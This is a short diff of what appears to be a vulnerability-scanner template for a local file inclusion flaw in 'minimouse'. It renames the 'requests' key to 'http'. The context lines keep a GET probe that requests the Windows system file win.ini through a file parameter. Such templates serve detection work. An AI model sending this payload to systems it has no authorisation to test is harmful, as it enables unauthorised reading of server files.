@@ -8,7 +8,7 @@ info:
   reference: https://www.exploit-db.com/exploits/49744
   tags: minimouse,lfi
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/file=C:%5CWindows%5Cwin.ini"
